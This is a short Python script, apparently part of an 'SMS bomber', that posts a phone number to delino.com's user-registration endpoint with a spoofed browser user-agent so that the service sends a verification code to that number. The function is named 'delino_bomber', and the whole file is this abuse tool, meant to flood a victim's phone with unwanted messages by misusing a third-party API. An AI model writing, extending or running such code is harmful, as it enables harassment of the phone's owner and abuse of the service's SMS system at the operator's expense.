import requests
from time import sleep
import random

heads = [
    {
        'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'accept': 'application/json, text/plain, */*',
    },
]

def delino_bomber(number):
    random_choose = random.choice(heads)
    delino_api = 'https://www.delino.com/user/register'
    json_request_api = {"mobile":"0"+number}
    try:
        req = requests.post(delino_api,json=json_request_api,headers=random_choose)
        if req.status_code == 200:
            print('delino Code Sent!')
        else:
            print(f"delino code: {req.status_code}")
    except:
        print('delino error!')    

delino_bomber('')